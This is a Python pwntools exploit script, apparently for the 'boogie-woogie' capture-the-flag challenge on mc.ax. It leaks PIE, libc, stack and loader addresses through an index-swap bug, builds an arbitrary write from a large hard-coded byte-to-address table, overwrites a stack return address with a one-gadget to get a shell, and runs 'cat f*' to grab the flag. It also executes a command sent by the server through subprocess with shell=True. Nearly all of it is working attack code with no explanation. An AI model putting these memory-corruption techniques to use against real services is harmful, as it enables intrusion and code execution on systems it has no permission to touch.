from pwn import *
# context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./boogie-woogie')
# p = process('exec script -q -c "./boogie-woogie" /dev/null'.split(" "))
p = remote("mc.ax",31040)
# p = remote("127.0.0.1",5009)
# nc mc.ax 31040


ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
p.readline()
cmd = p.readline()
res =subprocess.check_output(cmd,shell=True)
p.sendline(res)
def swap(a,b):
    sla(b'exception:\r\n',f"{a} {b}".encode())

def probe(idx):
    swap(1,idx)
    ru(b'\r\n')
    p.read(0xd)
    c = p.read(1)
    return c
def leakn(offset,n):
    res = []
    for x in range(offset,offset+n):
        res.append(ord(probe(x)))
    rrr =  0
    # for x in res:
        # print(hex(x))
    # input()
    for x in range(n):
        rrr*=0x100
        rrr+=res[n-1-x]
    # print(hex(rrr))
    # input()
    return rrr

try:
    swap(0x1000,0x1001)
    if b'egmentation f' in p.readline():
        exit(0)
    
except Exception as e:
    p.close()
    exit(1)


pie = leakn(-0x18,6) - 8
warning(hex(pie))
off = 0x0
# gdb.attach(p)


# off = int(input(),16)



heap = off+pie+0x1000
swap(0x1a9a+off,0x800)

sla(b'exception:\r\n', b"0"*0x600+b"3 4")


base = leakn(0x1aa0+off,6)
base = base - (0x7ffff7fa4c68-0x7ffff7d8a000)-0x78


env = 0x222200 + base

stack = leakn(env-pie-0x20,6)

bbb = pie+0x20

ldbase = leakn(0x21a008+base-bbb,6) +(0x00007ffff7fc3000-0x7ffff7fbb160)


if off!=0:
    ldbase -=0x6000

# input()
# context.log_level='debug'
def aaw(aaa,value,n):
    global bbb
    for _ in range(n):
        x = value&0xff
        val_off = lookup(x)-bbb
        warning(f"{aaa+_}->[{val_off+bbb}]")
        swap(aaa+_-bbb,val_off)
        value = (value >> 8)
known = {0: [140737352147032, 140737352147128, 140737352147136, 140737352147400, 140737352147408, 140737352147416, 140737352147440, 140737352147448, 140737352147592, 140737352147608, 140737352147616, 140737352147640, 140737352147648, 140737352147656, 140737352147672, 140737352147680, 140737352147688, 140737352147696, 140737352147704, 140737352147720, 140737352147728, 140737352147752, 140737352147760, 140737352147768, 140737352147792, 140737352147800, 140737352147808, 140737352147816, 140737352147824, 140737352147840, 140737352147848, 140737352147856, 140737352147864], 1: [140737352147536, 140737352147624, 140737352147664, 140737352147736, 140737352147784, 140737352147944, 140737352148008, 140737352148184, 140737352148200, 140737352148272, 140737352148336, 140737352148392, 140737352148448, 140737352148504, 140737352148560, 140737352148616, 140737352148672, 140737352148728, 140737352148784, 140737352148840, 140737352148896, 140737352148952, 140737352152320, 140737352152392, 140737352153072, 140737352153640, 140737352154848, 140737352154888, 140737352157824, 140737352176872, 140737352177048, 140737352180920, 140737353856136], 2: [140737352148168, 140737352148176, 140737352152400, 140737352152848, 140737354129952, 140737354130080, 140737354132608], 3: [140737352147456, 140737352147600, 140737352148032, 140737352149112, 140737352149120, 140737353856272, 140737353856480, 140737353858072, 140737354128096, 140737354128872, 140737354130856, 140737354132352], 4: [140737352149096, 140737352149104, 140737352154896, 140737353856240, 140737353856376, 140737354125384, 140737354128064, 140737354131056, 140737354132296, 140737354132512, 140737354133176], 5: [140737352147480, 140737353855168], 6: [140737353857056, 140737354129536, 140737354130896], 7: [140737352147928, 140737354133224], 8: [140737352147584, 140737352147832, 140737352147920, 140737353856424, 140737353856496, 140737354128864, 140737354131152, 140737354133208], 9: [140737352148680, 140737353855248, 140737354133064, 140737354133080], 10: [140737353857632, 93824992298688], 11: [140737354128808, 140737354133160], 12: [140737354133144], 13: [140737354130840], 14: [140737353856024], 15: [140737354133192], 16: [140737352147200, 140737352147272, 140737352148320, 140737352148384, 140737352148432, 140737352148496, 140737352148544, 140737352148608, 140737352148664, 140737352148712, 140737352148776, 140737352148824, 140737352148888, 140737352148936, 140737352149088, 140737352150304, 140737352150312, 140737352150560, 140737352150568, 140737352150816, 140737352150824, 140737352151072, 140737352151080, 140737352151328, 140737352151336, 140737352151584, 140737352151592, 140737352151840, 140737352151848, 140737352152096, 140737352152104, 140737353855672, 140737353856000], 17: [140737352152352, 140737352152360, 93824992297624, 93824992298664, 93824992366584], 18: [140737353857080, 140737354128952], 19: [140737353857016, 140737353857856, 140737353857984, 140737354133128], 20: [140737352147712, 140737353856792, 140737353857112, 140737353858008], 21: [140737352147488, 140737353857136, 140737353857656, 140737354128984], 22: [140737353855008, 140737353856752, 140737353856776, 140737353856800, 140737353856824, 140737353857160], 23: [140737353856816, 140737353857184, 140737354129912, 140737354133096, 140737354133104, 140737354133112], 24: [140737353857208, 140737354128120, 140737354130048, 140737354132320], 25: [140737352148736, 140737353857232], 26: [140737353855088, 140737354129776], 27: [140737352147568, 93824992297744], 28: [140737352147544], 29: [], 30: [140737352147472, 140737353857104], 31: [], 32: [140737352147360, 140737352149056, 140737352150320, 140737352150328, 140737352150576, 140737352150584, 140737352150832, 140737352150840, 140737352151088, 140737352151096, 140737352151344, 140737352151352, 140737352151600, 140737352151608, 140737352151856, 140737352151864, 140737352152112, 140737352152120, 140737352152448, 140737352152488, 140737352152504, 140737353855432, 140737353855792, 140737353856176, 140737353856256, 140737353856808, 140737353857680, 140737354128360, 140737354129248, 140737354130488, 140737354130816, 140737354131656, 140737354131704], 33: [93824992335560], 34: [140737352147432], 35: [], 36: [], 37: [], 38: [], 39: [], 40: [140737353857128], 41: [140737352148768, 140737352148832, 140737353856080], 42: [140737353856784], 43: [140737353857704], 44: [], 45: [140737354131016, 140737354133264], 46: [140737354133120, 140737354133136], 47: [140737353855296, 140737353856544, 140737354133312], 48: [140737352146960, 140737352147192, 140737352147216, 140737352147368, 140737352150336, 140737352150344, 140737352150592, 140737352150600, 140737352150848, 140737352150856, 140737352151104, 140737352151112, 140737352151360, 140737352151368, 140737352151616, 140737352151624, 140737352151872, 140737352151880, 140737352152128, 140737352152136, 140737353855440, 140737353855720, 140737354125360, 140737354128232, 140737354129552, 140737354130056, 140737354130248, 140737354130608, 140737354131712, 93824992297888, 93824992298672, 93824992298696, 93824992298704], 49: [93824992302776], 50: [140737353857152, 140737354133184, 140737354133200], 51: [93824992497680], 52: [140737353856760, 93824992297864, 93824992432144], 53: [93824992298680], 54: [140737353856528, 140737353857728, 140737354133288], 55: [], 56: [0x7fffffffefba], 57: [], 58: [140737352148792], 59: [93824992297728, 93824992297880], 60: [140737353857176], 61: [], 62: [], 63: [], 64: [140737352146984, 140737352147088, 140737352147120, 140737352147288, 140737352147352, 140737352147912, 140737352147960, 140737352150352, 140737352150360, 140737352150608, 140737352150616, 140737352150864, 140737352150872, 140737352151120, 140737352151128, 140737352151376, 140737352151384, 140737352151632, 140737352151640, 140737352151888, 140737352151896, 140737352152144, 140737352152152, 140737352152536, 140737352153208, 140737352157832, 140737353855000, 140737353855336, 140737353855472, 140737353856008, 140737353856304, 140737353856736, 140737353858096], 65: [140737352147576, 140737353857752, 140737354133152, 140737354133168], 66: [], 67: [], 68: [140737352147104], 69: [140737354133216, 140737354133232], 70: [140737353857200], 71: [], 72: [93824992297808], 73: [140737352147520, 140737352154904], 74: [], 75: [140737352148848], 76: [140737353857776, 93824992292872], 77: [], 78: [], 79: [140737352148192, 140737352152376], 80: [140737352147000, 140737352147240, 140737352147256, 140737352150368, 140737352150376, 140737352150624, 140737352150632, 140737352150880, 140737352150888, 140737352151136, 140737352151144, 140737352151392, 140737352151400, 140737352151648, 140737352151656, 140737352151904, 140737352151912, 140737352152160, 140737352152168, 140737353854976, 140737353855480, 140737353856016, 140737353856192, 140737353857224, 140737354128248, 140737354130288, 140737354131064, 140737354131752, 140737354132488, 140737354132528, 140737354133384], 81: [140737352152368], 82: [], 83: [], 84: [140737352147504, 93824992297712], 85: [93824992302784], 86: [], 87: [140737353855080, 140737353857800, 140737353857824], 88: [140737352153632, 140737353856368, 140737353856392], 89: [], 90: [140737353857248], 91: [93824992297816], 92: [140737352148880, 140737352148944], 93: [], 94: [140737354128088], 95: [140737353855304, 140737353856552, 140737354133320], 96: [140737352146952, 140737352146968, 140737352147384, 140737352147392, 140737352149136, 140737352150384, 140737352150392, 140737352150640, 140737352150648, 140737352150896, 140737352150904, 140737352151152, 140737352151160, 140737352151408, 140737352151416, 140737352151664, 140737352151672, 140737352151920, 140737352151928, 140737352152176, 140737352152184, 140737352152456, 140737352152472, 140737352152872, 140737352153216, 140737353855368, 140737353855416, 140737353856384, 140737353856576, 140737353856600, 140737353856632, 140737353856664, 140737353858120], 97: [140737354133280, 93824992292968, 93824992293000, 93824992297632], 98: [140737353855320, 140737353856568], 99: [140737354133256, 93824992292912, 93824992293024], 100: [93824992292984, 93824992297792], 101: [140737353857272, 93824992292976, 93824992297640, 93824992297664, 93824992297752], 102: [140737353856168], 103: [140737354133248, 93824992297856], 104: [140737354130128, 140737354130864, 93824992292928, 93824992292960, 93824992297768, 93824992297840], 105: [140737352148904, 93824992293016], 106: [], 107: [140737352148328, 140737352148376], 108: [140737353856520, 140737354133272, 140737354133304, 93824992292904], 109: [140737353854984, 140737353855064, 140737353855144, 140737353855224], 110: [93824992292936, 93824992293032, 93824992297648, 93824992297824], 111: [93824992292944, 93824992292992, 93824992297832], 112: [140737352147144, 140737352147320, 140737352150400, 140737352150408, 140737352150656, 140737352150664, 140737352150912, 140737352150920, 140737352151168, 140737352151176, 140737352151424, 140737352151432, 140737352151680, 140737352151688, 140737352151936, 140737352151944, 140737352152192, 140737352152200, 140737352153096, 140737353855408, 140737353857296, 140737354128472, 140737354128856, 140737354130200, 140737354130376, 140737354131120, 140737354131960, 93824992292920, 93824992293008, 93824992297776], 113: [140737352147528, 140737354131608, 140737354133024], 114: [140737353855160, 140737353857040, 93824992297688, 93824992297720], 115: [140737353857064, 140737354133296], 116: [140737353857088, 93824992292952, 93824992297680, 93824992297704], 117: [140737353856768, 140737353856968, 140737353857880, 140737353857960, 93824992297784], 118: [140737353856992], 119: [], 120: [140737353855240, 140737353855312, 140737353856560, 140737354132368], 121: [], 122: [140737354133072], 123: [140737352148344, 140737353857320], 124: [], 125: [], 126: [], 127: [140737352147424, 140737352180224, 93824992292896], 128: [140737352147008, 140737352147024, 140737352147152, 140737352147168, 140737352147224, 140737352147280, 140737352147336, 140737352148960, 140737352149128, 140737352149800, 140737352149824, 140737352150416, 140737352150424, 140737352150672, 140737352150680, 140737352150928, 140737352150936, 140737352151184, 140737352151192, 140737352151440, 140737352151448, 140737352151696, 140737352151704, 140737352151952, 140737352151960, 140737352152208, 140737352152216, 140737352152304, 140737352152512, 140737352152840, 140737352153192, 140737352176896, 140737353855552], 129: [140737353856880], 130: [140737353857472], 131: [140737353857496], 132: [140737352152960, 140737352176856, 140737353857520, 140737354133056], 133: [140737353857544, 140737353857808, 140737353857832, 140737353858080], 134: [140737352152736, 140737353857344, 140737353857568], 135: [140737353857592], 136: [140737352149040, 140737352149664, 140737353857616, 140737354130152, 140737354131568, 140737354132376], 137: [140737353857640], 138: [], 139: [140737352148400], 140: [140737353856112, 140737354132440], 141: [0x7ffff7fa724f], 142: [], 143: [], 144: [140737352146976, 140737352150432, 140737352150440, 140737352150688, 140737352150696, 140737352150944, 140737352150952, 140737352151200, 140737352151208, 140737352151456, 140737352151464, 140737352151712, 140737352151720, 140737352151968, 140737352151976, 140737352152224, 140737352152232, 140737352152344, 140737353855360, 140737353855576, 140737353856072, 140737353856416, 140737353856440, 140737353857256, 140737354128208, 140737354128504, 140737354129568, 140737354130168, 140737354130224, 140737354130848, 140737354130984, 140737354131640, 140737354132064], 145: [140737353857280, 140737353857368, 93824992296968], 146: [140737353857304], 147: [140737353857328], 148: [140737353857352, 140737354130000], 149: [140737353857376], 150: [140737353857400], 151: [140737353857424], 152: [140737353857448], 153: [], 154: [], 155: [140737352148440, 140737352148488], 156: [140737352147512, 140737353857392], 157: [], 158: [], 159: [], 160: [140737352147064, 140737352147208, 140737352150448, 140737352150456, 140737352150704, 140737352150712, 140737352150960, 140737352150968, 140737352151216, 140737352151224, 140737352151472, 140737352151480, 140737352151728, 140737352151736, 140737352151984, 140737352151992, 140737352152240, 140737352152248, 140737352152480, 140737352152544, 140737352152704, 140737352152896, 140737352152968, 140737352152976, 140737352152984, 140737352152992, 140737352153000, 140737352153008, 140737352153016, 140737352153024, 140737352153064, 140737352153120, 140737352153184], 161: [], 162: [], 163: [], 164: [], 165: [140737352148456], 166: [], 167: [140737353857416], 168: [140737354131208], 169: [], 170: [], 171: [140737354132464, 140737354132472], 172: [140737354130928], 173: [], 174: [], 175: [140737352147496], 176: [140737352146992, 140737352147112, 140737352147248, 140737352147304, 140737352149672, 140737352149680, 140737352149688, 140737352149696, 140737352149704, 140737352149712, 140737352149720, 140737352149728, 140737352150256, 140737352150264, 140737352150464, 140737352150472, 140737352150720, 140737352150728, 140737352150976, 140737352150984, 140737352151232, 140737352151240, 140737352151488, 140737352151496, 140737352151744, 140737352151752, 140737352152000, 140737352152008, 140737352152256, 140737352152264, 140737353855456, 140737353857664, 140737354125352], 177: [140737352147552, 140737353857688], 178: [140737353857440, 140737353857712], 179: [140737353857736], 180: [140737353856744, 140737353857760, 140737353858032], 181: [140737353857784, 140737353858056], 182: [], 183: [140737352148512], 184: [140737354129968, 140737354131008, 140737354132304], 185: [140737353857840, 140737353857864, 140737353857888], 186: [], 187: [], 188: [], 189: [140737353857464], 190: [], 191: [], 192: [140737352146944, 140737352147040, 140737352147048, 140737352147056, 140737352147072, 140737352147184, 140737352147232, 140737352147264, 140737352147296, 140737352147312, 140737352147328, 140737352147344, 140737352148992, 140737352149000, 140737352149008, 140737352149016, 140737352149024, 140737352149032, 140737352149376, 140737352149632, 140737352150112, 140737352150480, 140737352150488, 140737352150736, 140737352150744, 140737352150992, 140737352151000, 140737352151248, 140737352151256, 140737352151504, 140737352151512, 140737352151760, 140737352151768], 193: [], 194: [140737352152576, 140737352152584, 140737352152592, 140737352152600, 140737352152608, 140737352152616, 140737352152624, 140737352152632, 140737352152640, 140737352152648, 140737352152656, 140737352152664, 140737352152672], 195: [], 196: [140737352147176], 197: [], 198: [], 199: [], 200: [140737353857488, 140737354129608, 140737354129616, 140737354130920], 201: [140737352148552, 140737352148600, 140737353856280], 202: [], 203: [], 204: [], 205: [140737353857952], 206: [], 207: [], 208: [140737352147016, 140737352147160, 140737352148000, 140737352150496, 140737352150504, 140737352150752, 140737352150760, 140737352151008, 140737352151016, 140737352151264, 140737352151272, 140737352151520, 140737352151528, 140737352151776, 140737352151784, 140737352152032, 140737352152040, 140737353855504, 140737353855696, 140737353856248, 140737354128256, 140737354130272, 140737354130312], 209: [], 210: [], 211: [140737353857512], 212: [], 213: [], 214: [], 215: [], 216: [140737352152408, 140737353856096, 140737353856104, 140737353856960, 140737353857872, 140737354128976, 140737354129152], 217: [140737352148568, 140737353857976], 218: [], 219: [], 220: [], 221: [140737352147560], 222: [140737353857536], 223: [0x7fffffffed0a], 224: [140737352147096, 140737352147376, 140737352150512, 140737352150520, 140737352150768, 140737352150776, 140737352151024, 140737352151032, 140737352151280, 140737352151288, 140737352151536, 140737352151544, 140737352151792, 140737352151800, 140737352152048, 140737352152056, 140737352152464, 140737353855592, 140737353855688, 140737353856064, 140737353856624, 140737353856656, 140737354125376, 140737354128264, 140737354129256, 140737354129696, 140737354130184, 140737354130280, 140737354130408, 140737354131304, 140737354131320, 140737354131336, 140737354131352], 225: [], 226: [], 227: [140737352147464, 140737353858000], 228: [140737353856984], 229: [], 230: [], 231: [0x21a274+base], 232: [140737353856048, 140737354129640, 140737354129648], 233: [140737352148624, 140737353857560], 234: [], 235: [], 236: [], 237: [140737353858024], 238: [], 239: [], 240: [140737352147080, 140737352150272, 140737352150280, 140737352150528, 140737352150536, 140737352150784, 140737352150792, 140737352151040, 140737352151048, 140737352151296, 140737352151304, 140737352151552, 140737352151560, 140737352151808, 140737352151816, 140737352152064, 140737352152072, 140737353855136, 140737353855352, 140737353855384, 140737353855608, 140737353855632, 140737353856400, 140737353856464, 140737353856584, 140737353856608, 140737353856640, 140737353856672, 140737353857008, 140737353857848, 140737354128152, 140737354128200, 140737354128896], 241: [93824992497688, 93824992563224], 242: [], 243: [], 244: [140737353857584], 245: [], 246: [140737353856888], 247: [], 248: [140737353858048], 249: [140737352148656, 140737352148720], 250: [140737353857032], 251: [], 252: [], 253: [], 254: [], 255: [140737352147632, 140737352147744, 140737352147776, 140737352148016, 140737352148024, 140737352148136, 140737352148232, 140737352148296, 140737352149784, 140737352149808, 140737352149856, 140737352152424, 140737352152856, 140737352152880, 140737352153080, 140737352153104, 140737352153152, 140737353856088, 140737353857608, 140737354130960, 140737354131104]}

def lookup(n):
    if(n in walk_map.keys()):
        return walk_map[n].pop()
    global known
    if len(known[n]) == 0 :
        with open("./log",'a+') as f:
            f.write(f"{hex(n)}\n")
        
        print(f"Unlucky {n}")
        exit(1)
    addr = known[n][0]
    known[n] = known[n][1:]
    if   addr < 0x0000555555563000+0x1000:
        addr    = addr-0x0000555555563000+ pie
    elif addr < 0x00005555555a6000:
        addr    = addr - 0x0000555555563000-0x1000 + heap
    elif addr < 0x00007ffff7e29000:
        addr    = addr - 0x00007ffff7c00000 + base
    elif addr < 0x00007ffff7fbd000:
        if off == 0:
            addr    = ldbase - 0x8000 + (addr-0x00007ffff7fbb000)
        else:
            addr    = ldbase - 0x2000 + (addr-0x00007ffff7fbb000)
    elif addr < 0x00007ffff7fff000:
        addr    = addr - 0x00007ffff7fc3000 + ldbase
    else:
        addr    = addr - 0x7fffffffee28 + stack
    success(f"{hex(addr)}->{n}")
    return addr
strsh = 0x1d8678+base
# warning(hex(0x0000000000035732+base))
# warning(hex(0x555555564700-0x555555564000+heap+0x600))
info(hex(base))
info(hex(stack))
info(hex(pie))
canary_addr = base - 0x2898
# swap(canary_addr+1-pie-0x20,0x888) # corrupt ceanary
got_addr = 0x21a040+base
target_val = 0xebc88+base


walk_map = {}
import random
def walking(start,end):
    global walk_map
    swap(1,0x800+random.randint(0x800,0xc00))
    for x in range(start,end):    
        # if x %0x100 ==0:
            # print(len(walk_map))
            # print(walk_map)
        tmp  = probe(x-pie-0x20)
        if p.read(1) != b'\x73':
            tmp = 0 
        # print(tmp)
        # input()
        if tmp not in walk_map.keys():
            walk_map[tmp] = []
        if len(walk_map[tmp])>0x20:
            continue
        else:
            walk_map[tmp].append(x)
    

for i in range(0,8):
    swap(stack-0x120+i-8-pie-0x020, stack-0x120+i+56-pie-0x020)

for i in range(8):
    swap(stack-0x80+i-pie-0x020,0x600+i)
aaw(stack-0x120,target_val,3)
p.sendlineafter(b'exception:\r\n',b"0 0")
context.log_level='debug'
p.read()
p.sendline("cat f*")
flag = p.read()
with open("./flag.remote",'ab+') as f:
    f.write(flag+b'\n')

p.interactive()
